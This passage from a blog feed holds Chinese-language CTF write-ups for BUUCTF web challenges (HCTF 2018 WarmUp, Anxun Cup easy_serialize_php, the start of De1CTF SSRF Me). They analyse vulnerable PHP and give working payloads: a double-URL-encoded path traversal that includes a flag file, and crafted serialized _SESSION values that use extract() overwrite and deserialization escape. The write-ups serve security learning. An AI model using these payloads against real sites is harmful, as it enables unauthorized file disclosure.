title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018 WarmUp</title>
      <link href="/2021/08/29/2021/ctf/15/"/>
      <url>/2021/08/29/2021/ctf/15/</url>
      
        <content type="html"><![CDATA[<p> 重新回顾了下这题</p><p><img src="/2021/08/29/2021/ctf/15/image-20210829094805908.png" alt="image-20210829094805908"></p><p>F12查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            $_page = urldecode($page);<br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p> 高亮显示文件函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>checkfile函数里（），提示我们source.php和hint.php</p><p>访问hint.php得到语句：</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>将传递的参数赋值给page，然后判断若page变量不存在或非字符串</p><p>则echo  “you can’t see it”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;$_page = mb_substr(<br>    $page,<br>    <span class="hljs-number">0</span>,<br>    mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>);<br><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>若变量page存在于whitelist数组中</p><p>则返回true</p><p>以下看几个php函数：</p><p>php in_array函数</p><p>定义和用法：</p><p>in_array()函数搜索数组中是否存在指定的值</p><p><strong>注释：</strong>如果search参数是字符串并且设置为true，则搜索区分大小写</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">in</span><span class="hljs-constructor">_array(<span class="hljs-params">search</span>,<span class="hljs-params">array</span>,<span class="hljs-params">type</span>)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>php mb_substr()函数</p><p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p><p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">mb_substr ( <span class="hljs-built_in">string</span> $str , <span class="hljs-built_in">int</span> $start [, <span class="hljs-built_in">int</span> $length = <span class="hljs-literal">NULL</span> [, <span class="hljs-built_in">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>str</em></td><td align="left">必需。从该 string 中提取子字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td></tr><tr><td align="left">encoding</td><td align="left">可选。字符编码。如果省略，则使用内部字符编码。</td></tr></tbody></table><p>php mb_strpos函数</p><p>定义和用法：</p><p>查找字符串在另一个字符串首次出现的位置</p><p>基于字符数执行一个多字节安全的strpos()操作，第一个字符的位置是0，第二个字符的位置是1，依次类推</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">strpos<span class="hljs-comment">(*string,find,start*)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定开始搜索的位置。</td></tr></tbody></table><p>我们大概就可以知道了，这段代码表示截取$page中’?’前部分，若无则截取整个$page</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$_page = urldecode($page);<br></code></pre></td></tr></table></figure><p>这里是对page进行url解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里首先判断$_REQUEST[‘file’]值非空</p><p>第二判断是否为字符串</p><p>再就是能否通过checkfile（）函数校验</p><p>后面是包含$_REQUEST[‘file’]文件</p><p>如果条件不满足就打印滑稽表情</p><p>结论：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>第一个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句对变量进行检验，要求<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>为字符串，否则返回<span class="hljs-literal">false</span><br><span class="hljs-number">2.</span>第二个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>数组中，存在则返回<span class="hljs-literal">true</span><br><span class="hljs-number">3.</span>第三个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断截取后的<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>数组中，截取<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>中<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>前部分，存在则返回<span class="hljs-literal">true</span><br><span class="hljs-number">4.</span>第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断url解码并截取后的<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>中，存在则返回<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs qml">若以上四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句均未返回值，则返回<span class="hljs-literal">false</span><br>有三个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句可以返回<span class="hljs-literal">true</span>，第二个语句直接判断<span class="hljs-string">``</span>$page<span class="hljs-string">``</span>，不可用<br>第三个语句截取<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句中，先进行<span class="hljs-built_in">url</span>解码再截取，因此我们可以将?经过两次<span class="hljs-built_in">url</span>编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>，仍可通过第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句校验。（<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>两次编码值为<span class="hljs-string">``</span><span class="hljs-string">&#x27;%253f&#x27;</span><span class="hljs-string">``</span>）,构造<span class="hljs-built_in">url</span>：<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=hint.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>hint.php和source.php都是白名单里文件</p><p>因为我们不知道ffffllllaaaagggg文件存放的具体位置<br>所以可以依次增加   ../</p><p>最后拿到flag</p><p><img src="/2021/08/29/2021/ctf/15/image-20210829101454490.png" alt="image-20210829101454490"></p><p>借鉴于：</p><p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_serialize_php</title>
      <link href="/2021/08/19/2021/ctf/14/"/>
      <url>/2021/08/19/2021/ctf/14/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p><p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p><p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img src="/2021/08/19/2021/ctf/14/image-20210819094121329.png"></p><p>发现了参数f</p><p>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>$function &#x3D; @$_GET[&#39;f&#39;];<br><br>function filter($img)&#123;<br>  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);<br>  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;<br>  return preg_replace($filter,&#39;&#39;,$img);<br>&#125;<br><br><br>if($_SESSION)&#123;<br>  unset($_SESSION);<br>&#125;<br><br>$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;<br>$_SESSION[&#39;function&#39;] &#x3D; $function;<br><br>extract($_POST);<br><br>if(!$function)&#123;<br>  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;<br>&#125;<br><br>if(!$_GET[&#39;img_path&#39;])&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);<br>&#125;else&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));<br>&#125;<br><br>$serialize_info &#x3D; filter(serialize($_SESSION));<br><br>if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;<br>  highlight_file(&#39;index.php&#39;);<br>&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;<br>  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!<br>&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;<br>  $userinfo &#x3D; unserialize($serialize_info);<br>  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));<br>&#125;<br></code></pre></td></tr></table></figure><p>正式审计前，我注意到了题目一个很大的提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-function"><span class="hljs-keyword">function</span> == &#x27;<span class="hljs-title">phpinfo</span>&#x27;)</span>&#123;<br>  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br></code></pre></td></tr></table></figure><p>顺着提示，赋值f=phpinfo进行查询。</p><p><img src="/2021/08/19/2021/ctf/14/image-20210819094711265.png"></p><p>找到了d0g3_f1ag.php，猜测flag在其中</p><p>接下来代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$img</span>)</span>&#123;<br>    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    $filter = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,$filter_arr).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">&#x27;&#x27;</span>,$img);<br>&#125;<br><br>$serialize_info = filter(serialize($_SESSION));<br></code></pre></td></tr></table></figure><p>filter函数是为了过滤用的</p><p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p><p>之后还会序列化，所以我们要反序列化操作一手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_SESSION)&#123;<br>    <span class="hljs-keyword">unset</span>($_SESSION);<br>&#125;<br><br>$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = $function;<br><br>extract($_POST);<br></code></pre></td></tr></table></figure><p>我萌发现unset函数将$_SESSION销毁了</p><p>然后重新赋予$_SESSION了新的值。</p><p>最后调用了extract($_POST);</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span> 函数从数组中将变量导入到当前的符号表。<br></code></pre></td></tr></table></figure><h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p><p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p><p>只剩下_SESSION[flag]=123。</p><p><img src="/2021/08/19/2021/ctf/14/1947190-20200419170914367-953947353.png" alt="img"></p><h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p><p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#正规序列化的字符串</span><br>$a = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;<br>var_dump(unserialize($a));<br><span class="hljs-comment">#带有多余的字符的字符串</span><br>$a_laji = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;<br>var_dump(unserialize($a_laji));<br></code></pre></td></tr></table></figure><p>有了这个逃逸概念的话，就大概可以理解了。</p><p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p><p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;phpflagphpflag&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/19/2021/ctf/14/image-20210819210654326.png" alt="image-20210819210654326"></p><p><img src="/2021/08/19/2021/ctf/14/image-20210819210523566.png" alt="image-20210819210523566"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2019 SSRF Me</title>
      <link href="/2021/08/18/2021/ctf/13/"/>
      <url>/2021/08/18/2021/ctf/13/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机开启</p><p><img src="/2021/08/18/2021/ctf/13/image-20210818200351121.png" alt="image-20210818200351121"></p><p>明显的python代码段，复制下来并进行整理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><br><span 